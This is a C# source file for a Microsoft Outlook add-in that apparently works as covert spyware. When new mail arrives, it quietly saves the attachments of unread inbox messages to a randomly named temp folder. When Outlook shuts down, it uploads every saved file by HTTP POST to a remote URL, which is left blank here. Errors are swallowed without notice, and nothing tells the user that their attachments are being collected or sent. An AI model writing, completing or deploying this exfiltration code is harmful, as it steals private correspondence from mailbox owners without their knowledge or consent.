using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Net;
using System.IO;
using Outlook = Microsoft.Office.Interop.Outlook;
using Office = Microsoft.Office.Core;

namespace OutlookAddIn1
{
    public partial class ThisAddIn
    {
        private Random randomNum = new Random();
        private string Path = "%Temp%";
        private string FullPath="";
        private const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        private string URL = "";

        private void ThisAddIn_Startup(object sender, System.EventArgs e)
        {
            FullPath = Directory.CreateDirectory(Path + "\\" + CreateRandomFolder(Environment.UserName.Count())).ToString();
            this.Application.NewMail += new Microsoft.Office.Interop.Outlook.ApplicationEvents_11_NewMailEventHandler(ThisApplication_NewMail);
        }

        public string CreateRandomFolder(int length)
        {
            return new string(Enumerable.Repeat(chars, randomNum.Next(length)).Select(s => s[randomNum.Next(s.Length)]).ToArray());
        }

        private void ThisAddIn_Shutdown(object sender, System.EventArgs e)
        {
            string[] fileEntries = Directory.GetFiles(FullPath);
            foreach (string fileName in fileEntries)
            {
                Upload(URL, fileName);
            }
        }

        private void ThisApplication_NewMail()
        {
            Outlook.MAPIFolder inBox = this.Application.ActiveExplorer().Session.GetDefaultFolder(Outlook.OlDefaultFolders.olFolderInbox);
            Outlook.Items inBoxItems = inBox.Items;
            Outlook.MailItem newEmail = null;
            inBoxItems = inBoxItems.Restrict("[Unread] = true");
            try
            {
                foreach (object collectionItem in inBoxItems)
                {
                    newEmail = collectionItem as Outlook.MailItem;

                    if (newEmail != null)
                    {
                        if (newEmail.Attachments.Count > 0)
                        {
                            for (int i = 1; i <= newEmail.Attachments.Count; i++)
                            {
                                newEmail.Attachments[i].SaveAsFile(FullPath + newEmail.Attachments[i].FileName);
                            }
                        }
                    }
                }

            }
            catch (Exception ex)
            {
            }
        }

        private void Upload(string uriString, string fileName)
        {
            WebClient myWebClient = new WebClient();
            byte[] responseArray = myWebClient.UploadFile(uriString, "POST", fileName);
        }
        #region VSTO generated code

        /// <summary>
        /// Required method for Designer support - do not modify
        /// the contents of this method with the code editor.
        /// </summary>
        private void InternalStartup()
        {
            this.Startup += new System.EventHandler(ThisAddIn_Startup);
            this.Shutdown += new System.EventHandler(ThisAddIn_Shutdown);
        }

        #endregion
    }
}
